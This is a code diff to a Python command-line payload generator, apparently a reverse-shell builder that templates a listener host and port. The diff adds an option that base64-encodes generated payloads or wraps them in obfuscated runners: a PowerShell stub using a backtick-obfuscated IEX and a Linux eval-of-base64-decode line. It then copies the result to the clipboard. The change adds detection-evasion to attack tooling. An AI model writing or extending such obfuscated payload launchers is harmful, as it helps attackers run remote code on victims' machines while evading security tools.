@@ -18,6 +18,7 @@ import time
 from select import select
 import argparse
 import json
+import base64
 
 # external deps
 from colorama import Fore, Style, init as colorama_init
@@ -143,6 +144,20 @@ def normalize_connection(flag: str) -> str:
     val = flag.strip().lower()
     if val in ("tcp", "http"):
         return val
+    return None
+
+
+def normalize_crypto(flag: str) -> str | None:
+    """Map user flag to 'encode' or 'obfuscation' or None."""
+    if not flag:
+        return None
+    v = flag.strip().lower()
+    if v in ("encode", "encoding", "base64", "b64"):
+        return "encode"
+    if v in ("obfuscation", "obfuscate", "obf", "obs"):
+        return "obfuscation"
+    if v in ("none", "off"):
+        return None
     return None
 
 
@@ -335,6 +350,25 @@ def template_payload_content(raw: str, lhost: str, lport: int) -> str:
     except Exception:
         # Fallback (naive) replacement
         return raw.replace(lhost, '{LHOST}').replace(str(lport), '{LPORT}')
+
+
+def obfuscate_payload(os_choice: str, payload_text: str) -> str:
+    """Return an obfuscated wrapper that reconstructs and executes the payload at runtime.
+    Uses base64 + minimal token obfuscation for reliability.
+    """
+    try:
+        b64 = base64.b64encode(payload_text.encode('utf-8')).decode('utf-8')
+    except Exception:
+        b64 = payload_text
+    if os_choice == "Windows":
+        # PowerShell wrapper with light obfuscation of Invoke-Expression
+        return (
+            "$b='{b}'; $d=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); "
+            "I`E`X $d"
+        ).format(b=b64)
+    # Linux/Unix
+    # Use eval + base64 decode
+    return f"eval \"$(echo '{b64}' | base64 -d)\""
 
 
 def infer_connection_type_from_template(template: str) -> str:
@@ -977,6 +1011,7 @@ def main():
     parser.add_argument("-n", "--name", dest="name", help="Name for the payload (store mode)")
     parser.add_argument("-pay", "--payload", dest="payload", help="Payload content (store mode). Include your actual IP and port so they can be templated.")
     parser.add_argument("-k", "--key", dest="key", help="Key/name of payload to auto-select (use mode)")
+    parser.add_argument("-cry", "--crypto", dest="crypto", help="Optional: encode (base64) or obfuscation")
     args, unknown = parser.parse_known_args()
 
     # If explicit CLI mode is requested
@@ -1112,10 +1147,23 @@ def main():
         selected_port = tcp_port if connection == "tcp" else http_port
         payload_text = generate_payload_text(module_proxy, payload_key, lhost, selected_port)
 
+        # Optional crypto transform
+        crypto_mode = normalize_crypto(getattr(args, "crypto", None))
+        if crypto_mode == "encode":
+            try:
+                encoded = base64.b64encode(payload_text.encode("utf-8")).decode("utf-8")
+            except Exception:
+                encoded = payload_text
+            display_text = encoded
+        elif crypto_mode == "obfuscation":
+            display_text = obfuscate_payload(os_choice, payload_text)
+        else:
+            display_text = payload_text
+
         print("\n[+] Generated payload (copied to clipboard):\n")
-        print(Fore.RED + payload_text + Style.RESET_ALL)
+        print(Fore.RED + display_text + Style.RESET_ALL)
         try:
-            pyperclip.copy(payload_text)
+            pyperclip.copy(display_text)
             print("[+] Payload copied to clipboard.")
         except Exception as e:
             print(f"[!] Could not copy to clipboard: {e}")
@@ -1259,10 +1307,22 @@ def main():
     selected_port = tcp_port if connection == "tcp" else http_port
     payload_text = generate_payload_text(module_proxy, payload_key, lhost, selected_port)
 
+    # Interactive crypto option
+    crypto_choice = ask_choice("Crypto (none/encode/obfuscation): ", ["none", "encode", "obfuscation"])
+    if crypto_choice == "encode":
+        try:
+            payload_out = base64.b64encode(payload_text.encode("utf-8")).decode("utf-8")
+        except Exception:
+            payload_out = payload_text
+    elif crypto_choice == "obfuscation":
+        payload_out = obfuscate_payload(os_choice, payload_text)
+    else:
+        payload_out = payload_text
+
     print("\n[+] Generated payload (copied to clipboard):\n")
-    print(Fore.RED + payload_text + Style.RESET_ALL)
+    print(Fore.RED + payload_out + Style.RESET_ALL)
     try:
-        pyperclip.copy(payload_text)
+        pyperclip.copy(payload_out)
         print("[+] Payload copied to clipboard.")
     except Exception as e:
         print(f"[!] Could not copy to clipboard: {e}")
